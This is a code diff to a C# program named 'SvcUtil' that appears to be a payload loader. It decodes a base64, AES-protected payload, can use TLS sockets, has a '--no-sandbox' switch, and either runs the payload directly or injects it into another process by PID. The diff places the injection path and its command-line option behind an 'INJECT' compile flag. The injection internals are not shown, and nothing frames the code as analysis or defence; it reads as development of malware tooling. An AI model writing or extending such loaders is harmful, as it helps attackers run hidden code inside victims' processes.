@@ -1,5 +1,7 @@
 using System;
+#if INJECT
 using System.Diagnostics;
+#endif
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
@@ -20,7 +22,9 @@ namespace SvcUtil
         private static bool _useTls;
         private static string _payloadB64;
         private static string _aesPassword;
+#if INJECT
         private static int _targetPid;
+#endif
         private static bool _noSandbox;
 
         static void Main(string[] args)
@@ -38,7 +42,9 @@ namespace SvcUtil
             _useTls = false;
             _payloadB64 = null;
             _aesPassword = null;
+#if INJECT
             _targetPid = 0;
+#endif
             _noSandbox = false;
 
             if (!ParseArgs(args))
@@ -74,10 +80,12 @@ namespace SvcUtil
 
                 try
                 {
+#if INJECT
                     if (_targetPid > 0)
                         RemoteLoader.Inject(_targetPid, payload);
                     else
                         PayloadRunner.Execute(payload);
+#endif
                 }
                 finally
                 {
@@ -174,6 +182,7 @@ namespace SvcUtil
                         _aesPassword = args[++i];
                         break;
 
+#if INJECT
                     case "-i":
                     case "--inject":
                         if (i + 1 >= args.Length) return false;
@@ -188,6 +197,7 @@ namespace SvcUtil
                                 return false; // Process not found
                         }
                         break;
+#endif
 
                     case "--no-sandbox":
                         _noSandbox = true;
